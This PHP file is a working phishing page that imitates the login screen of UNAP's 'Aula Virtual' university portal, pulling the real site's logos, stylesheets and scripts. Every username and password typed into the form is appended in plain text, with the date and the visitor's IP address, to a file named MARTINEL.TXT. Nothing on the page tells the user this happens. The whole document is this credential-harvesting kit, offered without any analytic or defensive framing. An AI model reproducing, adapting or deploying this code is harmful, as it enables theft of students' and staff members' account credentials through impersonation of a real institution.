<?php
// martinel.php
// Guarda usuario y contraseña en MARTINEL.TXT (texto plano, sin encriptar)

define('OUTFILE', __DIR__ . DIRECTORY_SEPARATOR . 'MARTINEL.TXT');

// Limpiar archivo antiguo en JSON si existe
if (file_exists(OUTFILE)) {
    $content = @file_get_contents(OUTFILE);
    if ($content && strpos($content, 'password_hash') !== false) {
        @unlink(OUTFILE);
    }
}

$message = '';
$message_type = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = isset($_POST['username']) ? trim((string)$_POST['username']) : '';
    $pass = isset($_POST['password']) ? $_POST['password'] : '';

    if ($user === '' || $pass === '') {
        $message = 'Completa ambos campos.';
        $message_type = 'err';
    } else {
        // Obtener IP del cliente
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'desconocida';
        
        // Fecha y hora actual
        $fecha_hora = date('Y-m-d H:i:s');

        // Preparar registro en TXT simple
        $line = "Usuario: $user | Contraseña: $pass | Fecha: $fecha_hora | IP: $ip" . PHP_EOL;

        // Escribir con bloqueo
        $fp = @fopen(OUTFILE, 'a');
        if ($fp === false) {
            $message = 'No se pudo abrir el archivo.';
            $message_type = 'err';
        } else {
            if (flock($fp, LOCK_EX)) {
                fwrite($fp, $line);
                fflush($fp);
                flock($fp, LOCK_UN);
                fclose($fp);
                $message = 'Datos guardados correctamente.';
                $message_type = 'ok';
            } else {
                fclose($fp);
                $message = 'Error al guardar.';
                $message_type = 'err';
            }
        }
        unset($pass);
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="description" content="Aula Virtual Demo" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <title>Aula Virtual | Martinel</title>
    <link href="https://aulavirtual2.unap.edu.pe/images/themes/unap/favicon.ico" rel="icon">

    <!-- Estilos originales de Aula Virtual UNAP -->
    <link rel="stylesheet" href="https://aulavirtual2.unap.edu.pe/assets/vendors/bootstrap/dist/css/bootstrap.min.css" />
    <link rel="stylesheet" href="https://aulavirtual2.unap.edu.pe/assets/common/css/source/auth-main.css" />
    <link rel="stylesheet" href="https://aulavirtual2.unap.edu.pe/assets/common/css/source/forms/form-validation.css" />
    <link rel="stylesheet" href="https://aulavirtual2.unap.edu.pe/css/login.css" />
    <link rel="stylesheet" href="https://aulavirtual2.unap.edu.pe/css/themes/unap/login.css" />

    <style>
        /* Estilo adicional para mostrar mensajes PHP */
        .msg {
            font-weight: 600;
            text-align: center;
            margin-bottom: 10px;
        }
        .msg.ok { color: #5eea9b; }
        .msg.err { color: #ff8b8b; }
    </style>
</head>

<body class="theme-dark single-page single-page-inverse">
<section class="wrapper">
    <div class="intro">
        <div class="left-ovh">
            <div class="left-side">
                <div class="m-login__wrapper">
                    <form class="form" method="post" action="">
                        <a href="#">
                            <img class="logo" src="https://aulavirtual2.unap.edu.pe/images/themes/unap/logo.png" draggable="false">
                        </a>
                        <h1>AULA VIRTUAL</h1>

                        <?php if ($message): ?>
                            <div class="msg <?= htmlspecialchars($message_type, ENT_QUOTES, 'UTF-8') ?>">
                                <?= htmlspecialchars($message, ENT_QUOTES, 'UTF-8') ?>
                            </div>
                        <?php endif; ?>
                        
                        <div class="group">
                            <input name="username" placeholder="USUARIO" autocomplete="off" required />
                            <img class="ico" src="https://aulavirtual2.unap.edu.pe/images/login/user.svg" />
                            <div class="bar"></div>
                        </div>

                        <div class="group">
                            <input name="password" type="password" placeholder="CONTRASEÑA" required />
                            <img class="ico" src="https://aulavirtual2.unap.edu.pe/images/login/pass.svg" />
                            <div class="bar"></div>
                        </div>

                        <div class="group">
                            <button type="submit" class="btn button-submit">INGRESAR</button>
                            <a class="forget-password-label" href="#">¿Olvidaste tu contraseña?</a>
                        </div>
                    </form>
                </div>

                <div style="width:145px;left:25px;bottom:25px;position: fixed;">
                    <img src="https://aulavirtual2.unap.edu.pe/images/login/logo.svg" class="logo" />
                </div>
            </div>
            <div class="triangle"></div>
        </div>

        <div class="triangle right"></div>
        <div class="container-shape one"><div class="shape one"></div></div>
        <div class="container-shape two"><div class="shape two"></div></div>
        <div class="container-shape right three"><div class="right shape three"></div></div>
        <div class="container-shape right four"><div class="right shape four"></div></div>
        <div class="container-shape right five"><div class="right shape five"></div></div>
    </div>
</section>

<!-- Librerías JS necesarias para el diseño visual -->
<script src="https://aulavirtual2.unap.edu.pe/assets/vendors/jquery/jquery.min.js"></script>
<script src="https://aulavirtual2.unap.edu.pe/assets/vendors/bootstrap/dist/js/bootstrap.min.js"></script>
</body>
</html>